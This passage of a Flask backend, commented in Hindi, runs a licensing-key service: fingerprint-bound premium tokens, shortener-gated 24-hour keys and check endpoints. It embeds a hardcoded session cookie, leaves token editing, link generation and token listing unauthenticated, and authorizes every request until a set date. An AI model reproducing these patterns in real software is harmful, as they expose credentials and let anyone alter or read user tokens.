        'session': '.eJyt1Meuq2gCBOB3OVt6ZHK4Ui8wYHLmN2FjkcHkHFr97nPmHWZfq1J99c_PZ8znLu7zfv35s85b_tdPnKb5snzWocn7nz8_q_rmTZPj8px-xuNzyTw0gi72jhYzdM3LhmSWZCUvfyFRpQP5DfVxZKXPoLrW0FdNrfcoB-NmxCWPCS_nHdhC3AZ1sktWZ7uRfwjtCg3-6xrlfjDFcJdviQ7KlwjQ4Tkbhv1qeRxSzvZSFOUs5EAjOnQRKyHlAg2CHjjo5AnlnfC1ZovZIANBQCWTpIWrnZ2vFLkHo3xErEpdLaW0F0hGD9sb-N9wo3g7UMEmKBp-s9W9DLJFkf5cquo8p99r81bGfaYR4WOzCquXG8mzh9lbsIeb_iYTPUBTLi4IVrc77itz4fQ4qrs14zgJosrIcKFNS4FzM0Gp_bkzAuMbtoy8oDjd2A0gMTjyLUK6Zwp5DF1ZH7JcAF3wO2_EdVhllz2nYCVgNlyoYcZ8IvBgk4VXbeWkgO_QzGQd3LrEnSJSB-PU_1aVvGDJaHt4P17sXQiaj5n4KPNzZpHF-GVQprob0D-IZyfzS-IqCx3t_t50eqO0iXJzmsk2VDWlboNK4U3A1psaAje38ZOr58Qr7_1hM7tbPZ12KDi15_byPQ495WaTxcSXihSowDht7KvxCua1ZVq7UAlwhXYPSmsWbU0L2Ncu4p3uuonTZ6vnCyid44dqOZ7ftraZBCxX4mGhID6CVNv0BMvB-6F8KMAyEslnA82YGXYrr0DvgdFgkuK-p-DZ5eNebyyzinLmthGbMW0YJTrJKWisJiasUs1Nylu-Ju9jrDR-5R_usFB1sybRtdN9JbF___z1Mx6f_zMAjSLY5jB-Q2ijF3e35WLXv9MtBEJkKpyol6v0zOnelLb2YZQ1RSt0RH5DWEv13cagc4lbS53xpGZjv2oHYUVnokrAKjyaNQ1PNAuUt2sfUzGPZW3Iepjc1ozu1GUWtcS24kC-RloHtrlXJl1LcJRABZePq5VvWhzI5W0niG7ADjyu-Dmrqq5rwSKMc3-pI8zommL6-RvNPBUVzhDPxOXEeEHyWHOK3HioDgRLWXHSeP2MqjYGMi1Rh4qN2DoblQ2wp9l9R4UcNs3NSytR9Id2vb6dC3wQRO7tlOW5QxKFKZyhENIszgXSl6VbMRVmlTbKapXJvXN458zcpGXIaBk-eN6DxhVCb7lsBclQHetK-Dg0hQvsXbZxJpwKo1lt33P5QW00z1RXI1W05e6deUgvEkmoKZlfjFyecfts1pvOQ0Gfj4EFK7DxY7sjLSTWC_vivURpPiUIN5CmA35G9XaKvwd1mgH98G1YUk-Q66-ax3Ib88XTOCQQPrJXfZMZs2-QHl387vpOU1dRWzpxj5oOK50FLOPvntKI1MNqhC8hPzvHnGFVG9pJn7BIbK_TN05u1ZypV4RsMFanBrpJ1pJsS18rJ02zqKjfdplFLSKgFkGv9XfvqJPyOSG_eEVpQbl7vn2C6QSmHBp7DptiYbmy4EjiiRTkd2lEahJKikkTh2kUnUwNwdnc6H21p3A5oUGuov6LYl4-yy-Jevifh13fPcEScPGeXi6eDu42DCGAlZ14lwhWYJJ0-Sy5hNXwFF1tajuNZ4o6JcZRifzQLaoO_p3hJ8eseFpVbZxIzkCO9FKDbxT_x28KMAgTC9d58-HXl5jjpRXCa046gOJgh8_iLgIBT54IrfYBh8Lk9-Ox7vANbb3WaG3GEhUm68gHNIZWLBF-KLm7io_3UZfdObj159__AoKzV0c.ahuxUg.3yzDCVMd2G_RMG0etYeZt-MZZoo'
    }

    # Session ऑब्जेक्ट बनाएँ ताकि कुकीज़ और 302 रीडायरेक्ट ब्राउज़र की तरह हैंडल हो सकें
    session = requests.Session()
    session.cookies.update(cookies)

    try:
        # allow_redirects=True से यह 302 लोकेशन को फॉलो करेगा और नया HTML लाए
        response = session.get(
            target_url, 
            headers=headers,
        )
        print(response.text)
        response = session.get(
            target_url, 
            headers=headers, 
            allow_redirects=True, 
            timeout=15
        )

        # अंतिम रिस्पॉन्स क्लाइंट को वापस भेजें
        return Response(
            response.content, 
            status=response.status_code, 
            content_type=response.headers.get('content-type', 'text/html')
        )

    except requests.exceptions.RequestException as e:
        return {"error": str(e)}, 500
@app.route('/get-time', methods=['GET', 'OPTIONS'])
def get_custom_time():
    if request.method == 'OPTIONS':
        return '', 200

    try:
        # हमेशा एशिया/कोलकाता (IST) का एकदम सही समय लेगा
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        current_time_kolkata = datetime.now(tz_kolkata)
        
        # ISO 8601 फॉर्मेट में समय भेजना ताकि जावास्क्रिप्ट इसे आसानी से समझ सके
        # उदाहरण: 2026-05-10T10:22:00.123456+05:30
        formatted_time = current_time_kolkata.isoformat()
        
        return jsonify({
            "status": "success",
            "datetime": formatted_time
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check-key-type', methods=['GET', 'OPTIONS'])
def check_key_type():
    if request.method == 'OPTIONS':
        return '', 200

    try:
        # फ्रंटएंड से टोकन प्राप्त करना (?token=xyz)
        token = request.args.get('token')

        if token:
            # चेक करें कि क्या यह टोकन प्रीमियम डेटाबेस में मौजूद है
            premium_doc = premium_collection.find_one({"final_token": token})
            
            if premium_doc:
                # अगर टोकन प्रीमियम डेटाबेस में मिल गया
                return jsonify({
                    "status": "success",
                    "type": "premium"
                }), 200

        # अगर टोकन नहीं मिला या कुछ और भेजा गया है, तो डिफ़ॉल्ट URL Shortener मान लें
        return jsonify({
            "status": "success",
            "type": "url_shortner"
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
@app.route('/tokens/edit-premium', methods=['GET', 'POST'])
def premium_tokens_editor_ui():
    if request.method == 'GET':
        try:
            prem_cursor = premium_collection.find({})
            prem_data = []
            for p in prem_cursor:
                p['_id'] = str(p['_id']) 
                prem_data.append(p)
                
            tokens_json = json.dumps(prem_data, indent=4)

            html_template = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Premium Token Editor</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1e1e1e; color: #d4d4d4; margin: 0; padding: 20px; }
                    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
                    h2 { margin: 0; color: #c678dd; } 
                    textarea { width: 100%; height: 75vh; background-color: #252526; color: #9cdcfe; font-family: 'Courier New', Courier, monospace; font-size: 14px; padding: 15px; border: 1px solid #333; border-radius: 8px; box-sizing: border-box; outline: none; resize: vertical; }
                    textarea:focus { border-color: #c678dd; }
                    .btn-save { background-color: #c678dd; color: white; border: none; padding: 10px 24px; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; }
                    .btn-save:hover { background-color: #a05eb5; }
                    #status-msg { font-weight: bold; margin-top: 10px; }
                </style>
            </head>
            <body>
                <div class="header">
                    <h2>Premium Token Editor (JSON)</h2>
                    <button class="btn-save" onclick="saveTokens()">💾 Save Premium Changes</button>
                </div>
                <div id="status-msg"></div>
                <textarea id="json-editor">{{ tokens_json }}</textarea>

                <script>
                    function showMessage(msg, isError) {
                        const statusEl = document.getElementById('status-msg');
                        statusEl.innerText = msg;
                        statusEl.style.color = isError ? '#f44336' : '#4caf50';
                        setTimeout(() => statusEl.innerText = '', 5000);
                    }

                    function saveTokens() {
                        const jsonText = document.getElementById('json-editor').value;
                        let parsedData;
                        
                        try {
                            parsedData = JSON.parse(jsonText);
                        } catch (e) {
                            alert("❌ Invalid JSON Format!\\n\\nDetails: " + e.message);
                            showMessage("Syntax Error in JSON!", true);
                            return;
                        }

                        showMessage("Saving...", false);
                        document.querySelector('.btn-save').disabled = true;

                        fetch('/tokens/edit-premium', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(parsedData)
                        })
                        .then(response => response.json())
                        .then(data => {
                            document.querySelector('.btn-save').disabled = false;
                            if(data.status === 'success') {
                                alert("✅ Premium Tokens successfully updated!");
                                showMessage("Saved Successfully!", false);
                            } else {
                                alert("❌ Error: " + data.message);
                                showMessage("Error saving data.", true);
                            }
                        })
                        .catch(err => {
                            document.querySelector('.btn-save').disabled = false;
                            alert("❌ Network Error!");
                            showMessage("Network Error.", true);
                        });
                    }
                </script>
            </body>
            </html>
            """
            # कैशिंग रोकने के लिए Response ऑब्जेक्ट
            response = make_response(render_template_string(html_template, tokens_json=tokens_json))
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response
            
        except Exception as e:
            return f"Error loading premium data: {str(e)}", 500

    elif request.method == 'POST':
        try:
            updated_data = request.get_json()
            if not isinstance(updated_data, list):
                return jsonify({"status": "error", "message": "Data format should be a JSON array (list)"}), 400

            # 1. डेटाबेस से पुराने सभी टोकन्स डिलीट करें ताकि कचरा न बचे
            premium_collection.delete_many({})

            # 2. अगर नया डेटा खाली नहीं है, तो उसे इन्सर्ट करें
            if len(updated_data) > 0:
                for p_token in updated_data:
                    p_token.pop('_id', None) # MongoDB अपनी नई _id खुद बना लेगा
                
                premium_collection.insert_many(updated_data)

            return jsonify({"status": "success", "message": "Premium tokens updated completely!"})

        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/admin/generate-premium-link/', methods=['POST'])
def generate_premium_link():
    try:
        data = request.get_json() if request.is_json else {}
        validity_days = int(data.get('validity_days', 30))
        
        execute_token = secrets.token_urlsafe(16)
        
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        created_at = datetime.now(tz_kolkata).isoformat()
        
        premium_data = {
            "execute_token": execute_token,
            "status": "pending", 
            "validity_days": validity_days,
            "created_at": created_at,
            "browser_fingerprint": None,
            "final_token": None,
            "is_saved": "no",          
            "app_device_id": None      
        } 
        premium_collection.insert_one(premium_data)
        protocol = request.headers.get('X-Forwarded-Proto', 'http')
        auth_link = f"{protocol}://{request.host}/premium-auth?token={execute_token}"
        
        return jsonify({
            "status": "success",
            "execute_token": execute_token,
            "auth_link": auth_link,
            "validity_days": validity_days,
            "message": "Premium link generated successfully."
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# =====================================================================
# 2. यूज़र इंटरफ़ेस (Frontend): ब्राउज़र में फिंगरप्रिंट बनाने वाला पेज
# =====================================================================
@app.route('/premium-auth', methods=['GET'])
def premium_auth_page():
    execute_token = request.args.get('token')
    if not execute_token:
        return "Invalid or Missing Token", 400

    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Premium Access</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f4f7f6; }
            .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; }
            #final-token { font-weight: bold; color: #2c3e50; font-size: 20px; margin: 20px 0; padding: 10px; background: #ecf0f1; border: 1px dashed #bdc3c7; word-break: break-all;}
            button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #27ae60; color: white; border: none; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>Verifying Your Device...</h2>
            <p id="status-text">Please wait while we generate your secure premium key.</p>
            <div id="token-container" style="display:none;">
                <p>Your Premium Token:</p>
                <div id="final-token"></div>
                <button onclick="copyToken()">Copy Token</button>
            </div>
        </div>

        <script>
            async function generateFingerprint() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("Premium Fingerprint", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Premium Fingerprint", 4, 17);
                
                const canvasData = canvas.toDataURL();
                const screenData = window.screen.width + "x" + window.screen.height + "-" + window.screen.colorDepth;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                const rawFingerprint = navigator.userAgent + screenData + timezone + canvasData;
                
                const msgBuffer = new TextEncoder().encode(rawFingerprint);
                const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                const fingerprintHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
                
                return fingerprintHash;
            }

            async function submitFingerprint() {
                const fp = await generateFingerprint();
                const execute_token = "{{ token }}";

                fetch('/api/premium/verify-fingerprint/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ execute_token: execute_token, fingerprint: fp })
                })
                .then(response => response.json())
                .then(data => {
                    if(data.status === 'success') {
                        document.getElementById('status-text').style.display = 'none';
                        document.getElementById('token-container').style.display = 'block';
                        document.getElementById('final-token').innerText = data.final_token;
                    } else {
                        document.getElementById('status-text').innerText = "Error: " + data.message;
                        document.getElementById('status-text').style.color = "red";
                    }
                })
                .catch(err => {
                    document.getElementById('status-text').innerText = "Network Error!";
                });
            }

            function copyToken() {
                const token = document.getElementById('final-token').innerText;
                navigator.clipboard.writeText(token);
                alert("Token Copied!");
            }

            window.onload = submitFingerprint;
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, token=execute_token)


# =====================================================================
# 3. बैकएंड (Backend): फिंगरप्रिंट सेव करना और फाइनल टोकन देना
# =====================================================================
@app.route('/api/premium/verify-fingerprint/', methods=['POST', 'OPTIONS'])
def verify_premium_fingerprint():
    if request.method == 'OPTIONS':
        return '', 200

    try:
        data = request.get_json()
        execute_token = data.get('execute_token')
        fingerprint = data.get('fingerprint')

        if not execute_token or not fingerprint:
            return jsonify({"status": "error", "message": "Missing required data"}), 400

        token_doc = premium_collection.find_one({"execute_token": execute_token})

        if not token_doc:
            return jsonify({"status": "error", "message": "Invalid link"}), 404

        if token_doc.get("status") != "pending":
            return jsonify({"status": "error", "message": "This link has already been used and is expired."}), 403

        final_token = secrets.token_hex(20)
        
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        activated_at = datetime.now(tz_kolkata).isoformat()

        premium_collection.update_one(
            {"_id": token_doc["_id"]},
            {"$set": {
                "status": "active",
                "browser_fingerprint": fingerprint,
                "final_token": final_token,
                "activated_at": activated_at
            }}
        )

        return jsonify({
            "status": "success",
            "final_token": final_token,
            "message": "Device registered and token generated successfully."
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/premium/check-key/', methods=['POST', 'OPTIONS'])
def check_premium_key():
    if request.method == 'OPTIONS':
        return '', 200
        
    try:
        data = request.get_json()
        final_token = data.get('final_token')
        
        app_device_id = data.get('app_device_id') or request.headers.get('X-SN-Signature')
        
        if not final_token:
            return jsonify({"status": "error", "message": "Final token is missing."}), 400
            
        if not app_device_id:
            return jsonify({"status": "error", "message": "Device ID (app_device_id) is missing."}), 400

        token_doc = premium_collection.find_one({"final_token": final_token})

        if not token_doc:
            return jsonify({"status": "error", "message": "Invalid token."}), 404

        if token_doc.get("status") == "expired":
            return jsonify({"status": "error", "message": "This premium token has expired."}), 403

        # 🌟 समाधान: समय की गणना (Time logic) को वेबहुक से पहले (ऊपर) लाया गया है 🌟
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        current_time_kolkata = datetime.now(tz_kolkata)
        
        activated_time = datetime.fromisoformat(token_doc["activated_at"])
        validity_days = token_doc.get("validity_days", 30) 
        expiration_time = activated_time + timedelta(days=validity_days)

        # --- मल्टी-डिवाइस सुरक्षा लॉजिक (is_saved) ---
        is_saved = token_doc.get("is_saved", "no")
        saved_device_id = token_doc.get("app_device_id")

        if is_saved == "no":
            premium_collection.update_one(
                {"_id": token_doc["_id"]},
                {"$set": {
                    "is_saved": "yes",
                    "app_device_id": app_device_id
                }}
            )
            
            # अब यह एरर नहीं देगा क्योंकि activated_time और expiration_time ऊपर बन चुके हैं
            webhook_payload = {
                "auth_token": final_token,
                "app_signature": app_device_id,
                "start_time": activated_time.strftime('%Y-%m-%d %H:%M:%S'),
                "expire_time": expiration_time.strftime('%Y-%m-%d %H:%M:%S'),
                "status": "active"
            }
            send_webhook_to_server1(webhook_payload)

        else:
            if saved_device_id != app_device_id:
                return jsonify({
                    "status": "error", 
                    "message": "This token is already in use on another device."
                }), 403

        # --- एक्सपायरी (Validity) चेक करना ---
        if current_time_kolkata <= expiration_time:
            days_left = (expiration_time - current_time_kolkata).days
            return jsonify({
                "status": "success", 
                "message": "Premium access granted.",
                "days_left": days_left
            }), 200
        else:
            premium_collection.update_one({"_id": token_doc["_id"]}, {"$set": {"status": "expired"}})
            return jsonify({"status": "error", "message": "Premium token has expired."}), 403
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
        
@app.route('/auth-Key1/generate-token/', methods=['GET', 'POST', 'OPTIONS'])
def handler():
    # OPTIONS रिक्वेस्ट के लिए 200 स्टेटस लौटाएं
    if request.method == 'OPTIONS':
        return '', 200

    try:
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown')
        if ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()
            
        current_time = datetime.now().timestamp()

        # मोंगोडीबी से डेटा पढ़ना
        doc = collection.find_one({"_id": DB_KEY})
        current_data = doc.get("data", {}) if doc else {}

        tz_kolkata = pytz.timezone('Asia/Kolkata')
        
        # 1. चेक करें कि क्या यूज़र की कोई एक्टिव की (Key) है (24 घंटे से कम पुरानी)
        for token, entry in current_data.items():
            if entry.get("ip") == user_ip:
                created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                hours_diff = (current_time - created_time) / 3600

                if hours_diff < 24:
                    return jsonify({
                        "status": "success",
                        "url": entry["short_url"],
                        "message": "Active session found"
                    }), 200

        # 2. एक्सपायर हो चुकी की (Key) को रीयूज़ (Reuse) करना
        reused_token = None
        date_time_now = datetime.now(tz_kolkata).isoformat()

        for token, entry in current_data.items():
            created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
            hours_diff = (current_time - created_time) / 3600

            if hours_diff >= 24:
                entry["ip"] = user_ip
                entry["created_at"] = date_time_now
                entry["status"] = "active"
                reused_token = token
                break

        # अगर पुरानी की रीयूज़ हो गई है
        if reused_token:
            collection.update_one({"_id": DB_KEY}, {"$set": {"data": current_data}}, upsert=True)
            return jsonify({
                "status": "success",
                "url": current_data[reused_token]["short_url"],
                "message": "Generation successful (Reused)"
            }), 200

        # 3. नई की (Key) बनाना (अगर कोई पुरानी या एक्सपायर की नहीं मिली)
        tracking_token = secrets.token_hex(16)
        final_token = secrets.token_hex(16)

        referer = request.headers.get('Referer') or request.headers.get('Origin')
        if referer:
            parsed_url = urlparse(referer)
            main_website_url = f"{parsed_url.scheme}://{parsed_url.netloc}/auth?token={final_token}"
        else:
            protocol = request.headers.get('X-Forwarded-Proto', 'http')
            main_website_url = f"{protocol}://{request.host}/auth?token={final_token}"

        tracking_api_url = f"https://key.lnkz.tech/?token={tracking_token}"
        api_url = f"https://arolinks.com/api?api={FA_KEY}&url={quote(tracking_api_url)}&format=json"
        
        api_response = requests.get(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        json_response = api_response.json()

        if json_response.get('status') == 'success':
            shortened_url = json_response.get('shortenedUrl')

            current_data[tracking_token] = {
                "ip": user_ip,
                "created_at": date_time_now,
                "short_url": shortened_url,
                "tracking_url": tracking_api_url,
                "main_url": main_website_url,
                "final_token": final_token,
                "status": "active"
            }

            # मोंगोडीबी में डेटा सेव करना
            collection.update_one({"_id": DB_KEY}, {"$set": {"data": current_data}}, upsert=True)

            return jsonify({
                "status": "success",
                "url": shortened_url,
                "message": "Generated new key"
            }), 200
        else:
            raise Exception(json_response.get('message', 'Shortener API Failure'))

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 200

@app.route('/auth-Key/check-keyh/', methods=['GET', 'OPTIONS'])
def verify_handler():
    # 1. CORS Headers और OPTIONS रिक्वेस्ट को हैंडल करना
    if request.method == 'OPTIONS':
        return Response(status=200)

    # URL से 'verify' पैरामीटर लेना (जैसे: ?verify=xyz)
    key_to_check = request.args.get('verify')
    if key_to_check:
        key_to_check = key_to_check.strip()

    if not key_to_check:
        return Response("No key provided", status=400, mimetype='text/plain')

    # Database Keys
    DB_KEY = "tokens_data" # Normal 24-hour tokens
    UNLIMITED_DB_KEY = "unlimited_tokens_data" # Unlimited validity tokens

    try:
        # --- STEP 1: CHECK UNLIMITED TOKENS FIRST ---
        u_doc = collection.find_one({"_id": UNLIMITED_DB_KEY})
        u_data = u_doc.get("data", {}) if u_doc else {}
        
        if key_to_check in u_data:
            return Response("Authorized", status=200, mimetype='text/plain')

        # --- STEP 2: CHECK STANDARD 24-HOUR TOKENS ---
        doc = collection.find_one({"_id": DB_KEY})
        
        if not doc or "data" not in doc:
            return Response("No Database Found", status=404, mimetype='text/plain')

        data = doc["data"]
        found_entry = None
        
        # JSON डेटा में final_token को ढूँढें
        for tracking_key, entry in data.items():
            if entry.get("final_token") == key_to_check:
                found_entry = entry
                break # सही एंट्री मिलते ही लूप बंद कर दें

        # अगर final_token डेटाबेस में मिल गया
        if found_entry is not None:
            # --- TIME CALCULATION LOGIC ---
            current_time = datetime.now().timestamp()
            # ISO फॉर्मेट से समय को पार्स करना (पिछले कोड के अनुसार)
            created_time = datetime.fromisoformat(found_entry["created_at"]).timestamp()
            
            time_diff_seconds = current_time - created_time
            hours_diff = time_diff_seconds / 3600 # सेकंड्स को घंटों में बदलें

            # Verify Condition (Less than 24 Hours)
            if hours_diff < 24:
                return Response("Authorized", status=200, mimetype='text/plain')
            else:
                return Response("Expired", status=401, mimetype='text/plain')
        else:
            return Response("Invalid Key", status=404, mimetype='text/plain')

    except Exception as e:
        # किसी भी तरह की सर्वर एरर के लिए
        return Response("Server Error: " + str(e), status=500, mimetype='text/plain')


@app.route('/auth-Key/check-key/app/', methods=['GET', 'OPTIONS'])
def verify_handler_app():
    # 1. CORS Headers और OPTIONS रिक्वेस्ट को हैंडल करना
    if request.method == 'OPTIONS':
        return Response(status=200)

    # ऐप सिग्नेचर हेडर से लेना
    app_signature = request.headers.get('X-SN-Signature')
    if not app_signature:
        return Response("App Signature Missing", status=400, mimetype='text/plain')

    # URL से 'verify' पैरामीटर लेना (जैसे: ?verify=xyz)
    key_to_check = request.args.get('verify')
    if key_to_check:
        key_to_check = key_to_check.strip()

    if not key_to_check:
        return Response("No key provided", status=400, mimetype='text/plain')

    try:
        # --- 8 जुलाई 2026 तक के लिए डायरेक्ट बाईपास (Direct Bypass) लॉजिक ---
        tz_kolkata = pytz.timezone('Asia/Kolkata')
        date_time_now_obj = datetime.now(tz_kolkata)
        
        # फिक्स एक्सपायरी डेट (8 जुलाई 2026 रात 11:59 तक)
        FIXED_EXPIRY_DATE = tz_kolkata.localize(datetime(2026, 7, 8, 23, 59, 59))

        # अगर वर्तमान समय 8 जुलाई 2026 से पहले का है, तो बिना सिग्नेचर या डेटाबेस चेक किए सीधे Authorized कर दें
        if date_time_now_obj <= FIXED_EXPIRY_DATE:
            return Response("Authorized", status=200, mimetype='text/plain')

        # --------------------------------------------------------------------------------
        # 9 जुलाई से नीचे दिया गया पुराना लॉजिक (Database + Signature Check) काम करेगा
        # --------------------------------------------------------------------------------

        # --- STEP 1: CHECK UNLIMITED TOKENS FIRST ---
        u_doc = collection.find_one({"_id": APP_UNLIMITED_DB_KEY})
        u_data = u_doc.get("data", {}) if u_doc else {}
        
        if key_to_check in u_data:
            return Response("Authorized", status=200, mimetype='text/plain')

        # --- STEP 2: CHECK STANDARD 24-HOUR TOKENS ---
        doc = collection.find_one({"_id": APP_DB_KEY})
        
        if not doc or "data" not in doc:
            return Response("No Database Found", status=404, mimetype='text/plain')

        data = doc["data"]
        found_entry = None
        
        # JSON डेटा में final_token को ढूँढें
        for tracking_key, entry in data.items():
            if entry.get("final_token") == key_to_check:
                found_entry = entry
                break 

        # अगर final_token डेटाबेस में मिल गया
        if found_entry is not None:
            # --- SIGNATURE MATCH LOGIC ---
            # चेक करें कि सेव किया गया सिग्नेचर भेजे गए सिग्नेचर से मैच करता है या नहीं
            if found_entry.get("app_signature") != app_signature:
                return Response("Signature Mismatch. Key cannot be shared.", status=403, mimetype='text/plain')

            # --- TIME CALCULATION LOGIC ---
            current_time = datetime.now().timestamp()
            created_time = datetime.fromisoformat(found_entry["created_at"]).timestamp()
            
            time_diff_seconds = current_time - created_time
            hours_diff = time_diff_seconds / 3600 

            # Verify Condition (Less than 24 Hours)
            if hours_diff < 24:
                return Response("Authorized", status=200, mimetype='text/plain')
            else:
                return Response("Expired", status=401, mimetype='text/plain')
        else:
            return Response("Invalid Key", status=404, mimetype='text/plain')

    except Exception as e:
        return Response("Server Error: " + str(e), status=500, mimetype='text/plain')

@app.route('/api/get_tokens', methods=['GET', 'OPTIONS'])
def get_tokens_handler():
    # OPTIONS रिक्वेस्ट को हैंडल करना
    if request.method == 'OPTIONS':
        return '', 200

    DB_KEY = "tokens_data"

    try:
        # मोंगोडीबी से पूरा डेटा प्राप्त करना
        doc = collection.find_one({"_id": DB_KEY})
        
        # अगर डेटा मौजूद है तो उसे निकालें, वरना खाली डिक्शनरी दें
        all_tokens = doc.get("data", {}) if doc else {}

        # डेटा को बिल्कुल tokens.json की तरह JSON फॉर्मेट में भेजना
        return jsonify(all_tokens), 200

    except Exception as e:
        # किसी भी तरह की एरर आने पर
        return jsonify({ 
            "status": "error", 
            "message": "डेटा लोड करने में समस्या आई: " + str(e) 
        }), 500

@app.route('/api/app/get_tokens', methods=['GET', 'OPTIONS'])
def get_app_tokens_handler():
    # OPTIONS रिक्वेस्ट को हैंडल करना
    if request.method == 'OPTIONS':
        return '', 200

    DB_KEY = APP_DB_KEY

    try:
        # मोंगोडीबी से पूरा डेटा प्राप्त करना
        doc = collection.find_one({"_id": DB_KEY})
        
        # अगर डेटा मौजूद है तो उसे निकालें, वरना खाली डिक्शनरी दें
        all_tokens = doc.get("data", {}) if doc else {}

        # डेटा को बिल्कुल tokens.json की तरह JSON फॉर्मेट में भेजना
        return jsonify(all_tokens), 200

    except Exception as e:
        # किसी भी तरह की एरर आने पर
        return jsonify({ 
            "status": "error", 
            "message": "डेटा लोड करने में समस्या आई: " + str(e) 
        }), 500

ALLOWED_REFERERS = ["shortxlinks.com", "arolinks.com"]
FALLBACK_SHORTENER_API_URL = "https://arolinks.com/api"
FALLBACK_SHORTENER_API_KEY = FA_KEY
"""
@app.route('/auth-Key/generate-token/app/', methods=['GET', 'POST', 'OPTIONS'])
def handler_app():
    logger.info(f"Incoming {request.method} request to /auth-Key/generate-token/app/")
    
    # OPTIONS रिक्वेस्ट के लिए 200 स्टेटस लौटाएं
    if request.method == 'OPTIONS':
        logger.debug("Handling OPTIONS request, returning 200")
        return '', 200
        
    try:
        # ऐप सिग्नेचर हेडर से लेना
        app_signature = request.headers.get('X-SN-Signature')
        logger.debug(f"Received App Signature: {app_signature}")
        
        if not app_signature:
            logger.warning("App Signature is missing in headers")
            return jsonify({
                "status": "error",
                "message": "App Signature is missing"
            }), 400

        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown')
        if ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()
        logger.debug(f"User IP identified as: {user_ip}")
            
        current_time = datetime.now().timestamp()

        # मोंगोडीबी से ऐप का डेटा पढ़ना
        logger.info(f"Fetching data from MongoDB for key: {APP_DB_KEY}")
        doc = collection.find_one({"_id": APP_DB_KEY})
        current_data = doc.get("data", {}) if doc else {}
        logger.debug(f"Total tokens found in database: {len(current_data)}")

        tz_kolkata = pytz.timezone('Asia/Kolkata')
        date_time_now_obj = datetime.now(tz_kolkata)
        date_time_now = date_time_now_obj.isoformat()
        
        # 1. चेक करें कि क्या यूज़र (उसी ऐप सिग्नेचर) की कोई एक्टिव की (Key) है (24 घंटे से कम पुरानी)
        logger.info("Checking for an existing active session (under 24 hours)...")
        for token, entry in current_data.items():
            if entry.get("app_signature") == app_signature:
                created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
                hours_diff = (current_time - created_time) / 3600
                logger.debug(f"Found token for signature {app_signature}. Age: {hours_diff:.2f} hours")

                if hours_diff < 24:
                    logger.info("Active session found. Returning existing short URL.")
                    return jsonify({
                        "status": "success",
                        "url": entry["short_url"],
                        "message": "Active session found"
                    }), 200

        # 2. एक्सपायर हो चुकी की (Key) को रीयूज़ (Reuse) करना
        logger.info("No active session found. Looking for an expired token to reuse...")
        reused_token = None

        for token, entry in current_data.items():
            created_time = datetime.fromisoformat(entry["created_at"]).timestamp()
            hours_diff = (current_time - created_time) / 3600

            if hours_diff >= 24:
                logger.debug(f"Expired token found for reuse: {token}. Age: {hours_diff:.2f} hours")
                reused_token = token
                break

        if reused_token:
            logger.info(f"Updating reused token {reused_token} in MongoDB...")
            
            # ट्रैकिंग टोकन वही रहेगा (ताकि Arolinks काम करता रहे)
            new_final_token = secrets.token_hex(16)
            entry = current_data[reused_token]
            
            entry["ip"] = user_ip
            entry["app_signature"] = app_signature
            entry["created_at"] = date_time_now
            entry["status"] = "active"
            entry["final_token"] = new_final_token
            
            # बायपास सिस्टम के लिए फ्लैग को रीसेट करें (ताकि उसे फिर से स्टेप 1 पूरा करना पड़े)
            if "is_tracked_url1" in entry:
                entry["is_tracked_url1"] = False

            # डेटाबेस में अपडेट करें
            collection.update_one({"_id": APP_DB_KEY}, {"$set": {"data": current_data}}, upsert=True)
            
            # वेबहुक ट्रिगर (नए फाइनल टोकन के साथ)
            webhook_payload = {
                "auth_token": new_final_token,
                "app_signature": app_signature,
